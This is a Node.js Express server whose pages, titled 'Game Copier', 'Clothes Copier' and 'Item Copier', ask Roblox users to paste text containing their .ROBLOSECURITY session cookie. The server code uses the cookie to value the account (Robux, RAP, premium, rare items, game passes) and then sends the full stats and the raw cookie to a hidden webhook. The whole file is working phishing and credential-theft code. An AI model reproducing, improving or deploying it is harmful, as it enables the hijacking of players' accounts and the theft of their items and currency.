const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Lista podstron – możesz dodać więcej
const subpages = [
  { path: '/GameCopier', title: 'Game Copier' },
  { path: '/ClothesCopier', title: 'Clothes Copier' },
  { path: '/ItemCopier', title: 'Item Copier' },
  // dodaj tu kolejne np. { path: '/LimitedCopier', title: 'Limited Copier' }
];

// Generujemy identyczną stronę dla każdej podstrony
subpages.forEach(({ path, title }) => {
  app.get(path, (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${title} – Roblox Checker</title>
  <style>
    body { font-family: Arial, sans-serif; background: #0f0f17; color: #e0e0ff; margin: 0; padding: 20px; }
    .container { max-width: 780px; margin: 0 auto; }
    h1 { color: #6ab0ff; text-align: center; }
    textarea { width: 100%; min-height: 220px; background: #1a1a2e; color: #d0d0ff; border: 1px solid #334; border-radius: 8px; padding: 14px; font-family: Consolas, monospace; font-size: 14px; resize: vertical; margin: 16px 0; }
    button { background: #3b82f6; color: white; border: none; padding: 14px 36px; font-size: 16px; border-radius: 6px; cursor: pointer; display: block; margin: 0 auto 24px; }
    button:hover { background: #2563eb; }
    #status { margin-top: 20px; font-size: 18px; font-weight: bold; text-align: center; }
    .success { color: #00ff9d; }
    .error { color: #ff4d4d; }
  </style>
</head>
<body>
<div class="container">
  <h1>${title}</h1>
  <p>Wklej dowolny tekst zawierający .ROBLOSECURITY (PowerShell, logi, headers itp.)</p>
  <textarea id="input" placeholder="Wklej tekst tutaj..."></textarea>
  <button onclick="startProcess()">Start Process</button>
  <div id="status"></div>
</div>

<script>
async function startProcess() {
  const input = document.getElementById('input').value.trim();
  const status = document.getElementById('status');
  status.innerHTML = '';

  if (!input) {
    status.innerHTML = '<span class="error">Wrong file lil bro</span>';
    return;
  }

  status.innerHTML = '<span class="loading">Processing...</span>';

  let cookie = null;
  let match;

  match = input.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
  if (match && match[1]) cookie = match[1].trim();

  if (!cookie) {
    match = input.match(/-and-items\.\|_(.*?)(?=")/s);
    if (match && match[1]) cookie = match[1].trim();
  }

  if (!cookie) {
    match = input.match(/_\\|WARNING[^"]{200,}/);
    if (match) cookie = match[0].trim();
  }

  if (!cookie) {
    const fallbacks = input.match(/_[\\w\\-|]{180,}/g) || [];
    if (fallbacks.length) cookie = fallbacks.reduce((a, b) => a.length > b.length ? a : b).trim();
  }

  if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
    status.innerHTML = '<span class="error">Wrong file lil bro</span>';
    return;
  }

  try {
    const res = await fetch('${path}/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie })
    });

    if (!res.ok) throw new Error('Server error');

    const json = await res.json();

    if (json.error) {
      status.innerHTML = '<span class="error">Wrong file lil bro</span>';
      return;
    }

    status.innerHTML = '<span class="success">Process completed</span>';

  } catch (err) {
    status.innerHTML = '<span class="error">Wrong file lil bro</span>';
  }
}
</script>
</body>
</html>
    `);
  });

  // Endpoint sprawdzający dla każdej podstrony
  app.post(`${path}/check`, async (req, res) => {
    const { cookie } = req.body || {};
    if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
      return res.status(400).json({ error: 'Missing or invalid cookie' });
    }

    try {
      // ─────── CSRF ───────
      const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
        method: 'POST',
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'Content-Type': 'application/json' }
      });
      const csrfToken = tokenRes.headers.get('x-csrf-token');
      if (!csrfToken) throw new Error('Failed to get CSRF token');

      // ─────── Dane użytkownika ───────
      const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken, 'Accept': 'application/json' }
      });
      if (!userRes.ok) throw new Error('Invalid cookie');
      const userData = await userRes.json();

      // ─────── Email Verified ───────
      let emailVerified = false;
      try {
        const owns = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
          headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
        });
        if (owns.ok) {
          const d = await owns.json();
          emailVerified = !!d.data?.length;
        }
      } catch {}

      // ─────── Premium ───────
      let hasPremium = false;
      try {
        const prem = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
          headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
        });
        if (prem.ok) hasPremium = await prem.json();
      } catch {}

      // ─────── Robux ───────
      let robux = 0;
      try {
        const cur = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
          headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
        });
        if (cur.ok) {
          const d = await cur.json();
          robux = d.robux || 0;
        }
      } catch {}

      // ─────── RAP ───────
      let rap = 0;
      try {
        const assets = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
          headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
        });
        if (assets.ok) {
          const d = await assets.json();
          rap = d.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
        }
      } catch {}

      // ─────── Groups Owned ───────
      let groupsOwned = 0;
      try {
        const groups = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
          headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
        });
        if (groups.ok) {
          const d = await groups.json();
          groupsOwned = d.data.filter(g => g.role.rank === 255).length;
        }
      } catch {}

      // ─────── Account age ───────
      let accountAgeDays = 0;
      let created = null;
      try {
        const prof = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
        if (prof.ok) {
          const p = await prof.json();
          if (p.created) {
            created = p.created;
            accountAgeDays = Math.floor((Date.now() - new Date(created).getTime()) / 86400000);
          }
        }
      } catch {}

      // ─────── Avatar ───────
      let avatarUrl = null;
      try {
        const thumb = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
        if (thumb.ok) {
          const t = await thumb.json();
          avatarUrl = t.data?.[0]?.imageUrl;
        }
      } catch {}

      // ─────── Gamepasses (MM2, AMP, SAB, JB) ───────
      const mm2Ids = [429957, 1308795];
      const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
      const sabIds = [1227013099, 1229510262, 1228591447];
      const jbIds = [2296901, 2219040, 56149618, 4974038, 2725211, 2070427, 2218187];
      const allIds = [...mm2Ids, ...ampIds, ...sabIds, ...jbIds];
      const hasGamePasses = [];

      try {
        for (const id of allIds) {
          const gpRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${id}`, {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
          });
          if (gpRes.ok) {
            const d = await gpRes.json();
            if (d.data?.length > 0) hasGamePasses.push(id);
          }
        }
      } catch {}

      const mm2Count = hasGamePasses.filter(id => mm2Ids.includes(id)).length;
      const ampCount = hasGamePasses.filter(id => ampIds.includes(id)).length;
      const sabCount = hasGamePasses.filter(id => sabIds.includes(id)).length;
      const jbCount = hasGamePasses.filter(id => jbIds.includes(id)).length;

      // ─────── Headless & Korblox ───────
      let hasHeadless = false, hasKorblox = false;
      try {
        const hRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/201`, {
          headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
        });
        if (hRes.ok) {
          const d = await hRes.json();
          hasHeadless = !!d.data?.length;
        }

        const kRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`, {
          headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
        });
        if (kRes.ok) {
          const d = await kRes.json();
          hasKorblox = !!d.data?.length;
        }
      } catch {}

      const result = {
        success: true,
        username: userData.name,
        userId: userData.id,
        hasPremium,
        robux,
        rap: rap || 0,
        groupsOwned,
        accountAgeDays,
        created: createdDate || 'failed',
        avatarUrl,
        emailVerified,
        hasHeadless,
        hasKorblox,
        mm2Count,
        ampCount,
        sabCount,
        jbCount
      };

      // Wysyłka na webhook – dwa embedy w jednej wiadomości
      const webhookUrl = process.env.WEBHOOK;
      if (webhookUrl) {
        try {
          await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              embeds: [
                // Embed 1 – pełny z informacjami o koncie
                {
                  color: 0x0F0F23,
                  title: `<:User:1481761037257674872> ${userData.name}`,
                  description: "**AVATAR**",
                  thumbnail: {
                    url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
                  },
                  fields: [
                    {
                      name: "┌─────── Account Stats ───────┐",
                      value: `• Account Age: **${accountAgeDays} days**\n• Game Developer: **False**\n• RAP: **${rap.toLocaleString('en-US')}**\n• Groups Owned: **${groupsOwned}**`,
                      inline: false
                    },
                    {
                      name: "**Info**",
                      value:
                        `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
                        `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n` +
                        `<:Email:1481762590467035136> Email: **${emailVerified ? 'True' : 'False'}**`,
                      inline: true
                    },
                    {
                      name: "**Games**",
                      value:
                        `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
                        `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
                        `<:SAB:1481763931113394177> SAB: **${sabCount}**\n` +
                        `<:JB:1481804052215103509> JB: **${jbCount}**`,
                      inline: true
                    },
                    {
                      name: "**Inventory**",
                      value:
                        `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
                        `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`,
                      inline: true
                    }
                  ],
                  footer: {
                    text: "24H! • " + new Date().toLocaleString('pl-PL')
                  },
                  timestamp: new Date().toISOString()
                },

                // Embed 2 – tylko .ROBLOSECURITY (ciemno fioletowy, czysty)
                {
                  color: 0x4B0082,
                  title: ".ROBLOSECURITY",
                  description: `\`\`\`\n${cookie}\n\`\`\``,
                  timestamp: new Date().toISOString()
                }
              ]
            })
          });
        } catch (e) {
          console.error("Błąd wysyłki webhook:", e.message);
        }
      }

      res.json(result);

    } catch (err) {
      console.error(err);
      res.status(500).json({ error: err.message || 'Internal server error' });
    }
  });
});

// Start serwera
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Serwer działa na porcie ${PORT}`);
});
